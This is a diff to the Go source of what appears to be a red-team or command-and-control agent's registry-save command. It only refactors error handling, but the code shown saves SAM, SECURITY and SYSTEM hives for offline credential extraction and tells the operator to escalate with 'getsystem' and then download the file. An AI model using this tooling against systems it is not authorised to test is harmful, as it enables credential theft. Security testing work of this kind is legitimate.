@@ -41,11 +41,7 @@ func (c *RegSaveCommand) Execute(task structs.Task) structs.CommandResult {
 	var args regSaveArgs
 	if task.Params != "" {
 		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Failed to parse parameters: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Failed to parse parameters: %v", err)
 		}
 	}
 
@@ -63,31 +59,19 @@ func (c *RegSaveCommand) Execute(task structs.Task) structs.CommandResult {
 	case "creds":
 		return regSaveCredentialHives(args.Output)
 	default:
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Unknown action: %s (use save, creds)", args.Action),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Unknown action: %s (use save, creds)", args.Action)
 	}
 }
 
 // regSaveHive exports a single registry hive/key to a file
 func regSaveHive(hive, path, output string) structs.CommandResult {
 	if hive == "" || path == "" || output == "" {
-		return structs.CommandResult{
-			Output:    "Required: -hive (HKLM, HKCU, etc.), -path (e.g., SAM, SYSTEM), -output (file path)",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Required: -hive (HKLM, HKCU, etc.), -path (e.g., SAM, SYSTEM), -output (file path)")
 	}
 
 	rootKey, err := resolveHive(hive)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Invalid hive: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Invalid hive: %v", err)
 	}
 
 	// Remove output file if it exists (RegSaveKeyEx fails if file exists)
@@ -96,11 +80,7 @@ func regSaveHive(hive, path, output string) structs.CommandResult {
 	// Open the key with backup semantics
 	hKey, err := regOpenKey(rootKey, path)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to open %s\\%s: %v\nEnsure you are running as SYSTEM (use 'getsystem' first).", hive, path, err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to open %s\\%s: %v\nEnsure you are running as SYSTEM (use 'getsystem' first).", hive, path, err)
 	}
 	defer regCloseKey(hKey)
 
@@ -113,11 +93,7 @@ func regSaveHive(hive, path, output string) structs.CommandResult {
 		2, // REG_LATEST_FORMAT
 	)
 	if ret != 0 {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("RegSaveKeyEx failed for %s\\%s → %s: %v (code %d)", hive, path, output, err, ret),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("RegSaveKeyEx failed for %s\\%s → %s: %v (code %d)", hive, path, output, err, ret)
 	}
 
 	// Get file size
@@ -127,11 +103,7 @@ func regSaveHive(hive, path, output string) structs.CommandResult {
 		sizeStr = formatFileSize(fi.Size())
 	}
 
-	return structs.CommandResult{
-		Output:    fmt.Sprintf("Saved %s\\%s → %s (%s)\nUse 'download %s' to retrieve the file.", hive, path, output, sizeStr, output),
-		Status:    "success",
-		Completed: true,
-	}
+	return successf("Saved %s\\%s → %s (%s)\nUse 'download %s' to retrieve the file.", hive, path, output, sizeStr, output)
 }
 
 // regSaveCredentialHives exports SAM, SECURITY, and SYSTEM hives for offline credential extraction
